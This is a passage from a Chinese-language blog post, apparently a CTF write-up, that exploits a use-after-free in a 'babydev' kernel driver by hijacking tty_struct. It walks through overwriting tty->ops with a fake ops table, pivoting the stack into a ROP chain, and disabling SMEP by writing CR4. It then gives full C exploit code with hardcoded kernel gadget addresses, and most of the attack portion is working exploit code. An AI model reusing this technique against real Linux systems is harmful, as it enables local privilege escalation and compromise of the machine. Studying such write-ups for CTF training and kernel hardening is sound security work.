			<span class="token keyword">while</span> <span class="token punctuation">(</span>nr <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token function">mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ldata<span class="token operator">-&gt;</span>output_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
				c <span class="token operator">=</span> tty<span class="token operator">-&gt;</span>ops<span class="token operator">-&gt;</span><span class="token function">write</span><span class="token punctuation">(</span>tty<span class="token punctuation">,</span> b<span class="token punctuation">,</span> nr<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ldata<span class="token operator">-&gt;</span>output_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
					retval <span class="token operator">=</span> c<span class="token punctuation">;</span>
					<span class="token keyword">goto</span> break_out<span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>c<span class="token punctuation">)</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				b <span class="token operator">+=</span> c<span class="token punctuation">;</span>
				nr <span class="token operator">-=</span> c<span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>nr<span class="token punctuation">)</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token operator">-&gt;</span>f_flags <span class="token operator">&amp;</span> O_NONBLOCK<span class="token punctuation">)</span> <span class="token punctuation">{</span>
			retval <span class="token operator">=</span> <span class="token operator">-</span>EAGAIN<span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token function">up_read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tty<span class="token operator">-&gt;</span>termios_rwsem<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token function">wait_woken</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>wait<span class="token punctuation">,</span> TASK_INTERRUPTIBLE<span class="token punctuation">,</span> MAX_SCHEDULE_TIMEOUT<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token function">down_read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tty<span class="token operator">-&gt;</span>termios_rwsem<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
break_out<span class="token operator">:</span>
	<span class="token function">remove_wait_queue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tty<span class="token operator">-&gt;</span>write_wait<span class="token punctuation">,</span> <span class="token operator">&amp;</span>wait<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">-</span> buf <span class="token operator">!=</span> nr <span class="token operator">&amp;&amp;</span> tty<span class="token operator">-&gt;</span>fasync<span class="token punctuation">)</span>
		<span class="token function">set_bit</span><span class="token punctuation">(</span>TTY_DO_WRITE_WAKEUP<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tty<span class="token operator">-&gt;</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">up_read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tty<span class="token operator">-&gt;</span>termios_rwsem<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span>b <span class="token operator">-</span> buf<span class="token punctuation">)</span> <span class="token operator">?</span> b <span class="token operator">-</span> buf <span class="token operator">:</span> retval<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br></div></div><p>可以看到这里关于<code>tty-&gt;ops</code>的使用只有两个位置:</p> <p><img src="https://s2.loli.net/2022/02/13/SR9zNTde2fKXCPk.png" alt="image-20220213205035210"></p> <p>另一个是 <code>tty-&gt;ops-&gt;write(tty, b, nr);</code>，</p> <p>两个不能同时触发， 判断条件为， <code>if (O_OPOST(tty)) {</code>， 可以在<code>include/linux/tty.h</code>找到这个宏的相关定义。对应的数据在偏移0x130的位置。</p> <p><img src="https://s2.loli.net/2022/02/13/1kJg7O2PxpsCS9z.png" alt="image-20220213211420121"></p> <p><img src="https://s2.loli.net/2022/02/13/eIPCNgsnX6mz7Hp.png" alt="image-20220213211727549"></p> <p>奇怪的是我使用以下的exp进行调试的过程中发现这个值并不会被改变，一直进入<code>tty-&gt;ops-&gt;flush_chars</code>。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;/dev/ptmx&quot;</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>fd1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;open error\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">write</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span> <span class="token string">&quot;1234&quot;</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>但是在实际的题目调试中可以看到另一个调用 <code>tty-&gt;ops-&gt;write</code></p> <p><img src="https://s2.loli.net/2022/02/13/SacWkZd2vUBhY3M.png" alt="image-20220213221845304"></p> <p>然后这里是我们要利用的位置偏移(这是到这个位置 还得再加一个指针就是覆盖)，和对应的内存</p> <p><img src="https://s2.loli.net/2022/02/13/Y4SVI6GWZsrxLmJ.png" alt="image-20220213214838032"></p> <p><img src="https://s2.loli.net/2022/02/13/uLVzITeGmoJWhai.png" alt="image-20220213214915795"></p> <h2 id="利用-2"><a href="#利用-2" class="header-anchor">#</a> 利用</h2> <p>仍然是之前那个uaf的题目， 这次尝试使用这个<code>tty_struct</code>，</p> <h3 id="fake-ops"><a href="#fake-ops" class="header-anchor">#</a> Fake_ops</h3> <p>和上个解法一样，open open ioctl close ， 然后open(&quot;ptmx&quot;) 可以得到<code>tty_struct</code>的地址，我们先read将数据读取，然后只修改<code>tty-&gt;ops</code>位置，修改到我们程序内的地址上,</p> <p>然后做一个伪造的ops结构体，其中的每个函数都写为 <code>0xffffffff81110c15: ret</code>地址, 第八个是write， 修改为随意一个地址进行测试。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>
<span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span>  uint64<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token operator">*</span> fake_ops<span class="token punctuation">[</span><span class="token number">0x34</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;/dev/babydev&quot;</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd1<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;open /dev/babydev error\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">int</span> fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;/dev/babydev&quot;</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd2<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;open /dev/babydev error\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span> <span class="token number">0x10001</span><span class="token punctuation">,</span> <span class="token number">0x2e0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;set chunk size = 0x2e0 = sizeof(struct tty_struct)\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//printf(&quot;close fd1, free chunk\n&quot;);</span>

    <span class="token keyword">int</span> tty <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;/dev/ptmx&quot;</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>tty<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;open /dev/ptmx error\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        fake_ops<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81110c15</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    fake_ops<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x12345678</span><span class="token punctuation">;</span>


    uint64 fake_tty<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> fake_tty<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fake_tty<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span>fake_ops<span class="token punctuation">;</span>

    <span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> fake_tty<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>tty<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br></div></div><p>成功</p> <p><img src="https://s2.loli.net/2022/02/13/unU6QzoLwvTiI4H.png" alt="image-20220213224755651"></p> <p><img src="https://s2.loli.net/2022/02/13/eyWcqQgOZ3BL8M5.png" alt="image-20220213225125928"></p> <h3 id="fake-stack"><a href="#fake-stack" class="header-anchor">#</a> fake_stack</h3> <p>我们继续审视下这个程序崩溃的位置</p> <p><img src="https://s2.loli.net/2022/02/13/KMg21iAuQZD9rGj.png" alt="image-20220213225444461"></p> <p>首先我们可以控制rip运行到这里， 寄存器中， 我们只能控制rax， 接下来的构造，</p> <ul><li>这个rip如果调用函数的话，在一次函数调用内进行提权肯定是不可能的。</li> <li>这个rip进行rop的话，可以配合rax修改rsp，</li></ul> <p>搜索，确实存在这个gadget，</p> <p><img src="https://s2.loli.net/2022/02/13/TtrfaneBqCl1LXP.png" alt="image-20220213230213987"></p> <p>那么rsp就来到了我们的rax， 即fake_ops中，在这里在进行一次栈迁移，</p> <p>这里选择了一个最短的rop放在fake_ops，</p> <p><img src="https://s2.loli.net/2022/02/13/vPK9pV4jwNseMAE.png" alt="image-20220213230532147"></p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>    <span class="token comment">// fake_ops</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        fake_ops<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81110c15</span><span class="token punctuation">;</span> <span class="token comment">// ret;</span>
    <span class="token punctuation">}</span>

    fake_ops<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8100202b</span><span class="token punctuation">;</span><span class="token comment">// pop rbp; ret;</span>
    fake_ops<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> rop<span class="token punctuation">;</span>
    fake_ops<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81002e44</span><span class="token punctuation">;</span> <span class="token comment">// leave; ret;</span>

    <span class="token comment">// ops-&gt;write </span>
    fake_ops<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8181bfc5</span><span class="token punctuation">;</span> <span class="token comment">// mov rax, rsp; dec ebx; ret;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>调试可以看到， 成功， 注意栈内数据两次变化。</p> <p><img src="https://s2.loli.net/2022/02/13/jKknC3T8XMbwd2E.png" alt="image-20220213230850063"></p> <p><img src="https://s2.loli.net/2022/02/13/jbMqSplKvNHQIAU.png" alt="image-20220213230935507"></p> <p>于是我们可以写rop了。</p> <h3 id="kernel-rop"><a href="#kernel-rop" class="header-anchor">#</a> kernel rop</h3> <p>这一部分如果全内核态rop提权，然后返回用户态的话其实和之前的kernel rop的文章一致。</p> <p>但是这个题目还有smep保护，这个保护不允许内核态执行用户态的代码。可以使用完全在内核态的rop来绕过。但是这个保护的开启表示在 cr4寄存器的第20位， 我们可以直接修改cr4寄存器关闭这个保护。然后就和之前的kernel rop两个手段都ok了。</p> <p>我们先看下开启和不开启smep的两种cr4</p> <p><img src="https://s2.loli.net/2022/02/13/zb7KFJ1PfdZYQar.png" alt="image-20220213233246365"></p> <p><img src="https://s2.loli.net/2022/02/13/FtlJ42b6vVCndo9.png" alt="image-20220213233253285"></p> <p>其实就改为0x6f0即可。</p> <p><img src="https://s2.loli.net/2022/02/13/HSKflcqMEF6p3mz.png" alt="image-20220213233430308"></p> <p>修改成功，后续利用就和kernel rop一样了。</p> <p><img src="https://s2.loli.net/2022/02/13/mGVFw4CIahLNKnx.png" alt="image-20220213233945772"></p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>    <span class="token comment">// rop </span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff810d238d</span><span class="token punctuation">;</span> <span class="token comment">// pop rdi; ret;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6f0</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81004d80</span><span class="token punctuation">;</span> <span class="token comment">// mov cr4, rdi; pop rbp; ret;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="exp"><a href="#exp" class="header-anchor">#</a> exp</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;

typedef unsigned long long  uint64;

void * fake_ops[0x34];
void * rop[0x100];

int main(){
    int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);
    if (fd1&lt;0){
        printf(&quot;open /dev/babydev error\n&quot;);
        exit(-1);
    }
    int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);
    if (fd2&lt;0){
        printf(&quot;open /dev/babydev error\n&quot;);
        exit(-1);
    }
    ioctl(fd1, 0x10001, 0x2e0);
    printf(&quot;set chunk size = 0x2e0 = sizeof(struct tty_struct)\n&quot;);
    close(fd1);
    //printf(&quot;close fd1, free chunk\n&quot;);

    int tty = open(&quot;/dev/ptmx&quot;, O_RDWR);
    if(tty&lt;0){
        printf(&quot;open /dev/ptmx error\n&quot;);
        exit(-1);
    }

    // rop 
    int i = 0;
    rop[i++] = 0; 
    rop[i++] = 0xffffffff810d238d; // pop rdi; ret;
    rop[i++] = 0x6f0;
    rop[i++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;
    rop[i++] = 0;
		
		// rop =&gt; 提权 和kernel rop一样， 不写了

    // fake_ops
    for (int i=0; i&lt;0x34; i++){
        fake_ops[i] = 0xffffffff81110c15; // ret;
    }

    fake_ops[0] = 0xffffffff8100202b;// pop rbp; ret;
    fake_ops[1] = rop;
    fake_ops[2] = 0xffffffff81002e44; // leave; ret;

    // ops-&gt;write 
    fake_ops[7] = 0xffffffff8181bfc5; // mov rax, rsp; dec ebx; ret;


    uint64 fake_tty[4];
    read(fd2, fake_tty, 0x20);
    // tty-&gt;ops
    fake_tty[3] = (uint64)fake_ops;
    write(fd2, fake_tty, 0x20);

    char buf[0x8] = {0};
    write(tty, buf, 0x8);

    return 0;
}

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br></div></div></div></div> <!----> <div class="page-edit"><!----> <!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">2/13/2022, 5:55:04 PM</span></div></div> <div class="page-nav-wapper"><!----> <!----></div></div> <!----></main></div> <div class="footer"><div class="icons"><a href="mailto:wl200103124@163.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/wlingze" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://blog.csdn.net/wlz_lc_4" title="csdn" target="_blank" class="iconfont icon-csdn"></a><a href="https://www.zhihu.com/people/wlingze" title="zhihu" target="_blank" class="iconfont icon-zhihu"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2019-2022
    <span>lingze | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.01f8cc77.js" defer></script><script src="/assets/js/2.5ece5099.js" defer></script><script src="/assets/js/32.045dc002.js" defer></script>
  </body>
</html>
